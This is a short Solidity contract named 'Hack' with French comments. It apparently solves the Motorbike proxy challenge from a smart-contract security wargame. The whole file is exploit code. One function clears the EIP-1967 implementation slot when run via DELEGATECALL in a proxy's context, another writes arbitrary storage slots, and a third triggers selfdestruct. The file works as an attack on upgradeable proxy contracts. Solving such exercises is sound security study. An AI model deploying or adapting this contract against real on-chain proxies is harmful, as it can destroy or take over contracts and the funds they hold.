// SPDX-License-Identifier: UNLICENSED
pragma solidity <0.7.0;

contract Hack {
    // même constante que Motorbike
    bytes32 constant IMPLEMENTATION_SLOT =
      0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    // sera exécuté via DELEGATECALL par le proxy => écrit dans le storage du proxy
    function clearImpl() public {
        assembly {
            sstore(IMPLEMENTATION_SLOT, 0)
        }
    }

    // alternative : si tu veux détériorer/écraser d'autres slots
    function poke(bytes32 slot, bytes32 value) public {
        assembly {
            sstore(slot, value)
        }
    }

	function boom() public {
        selfdestruct(payable(msg.sender));
    }
}
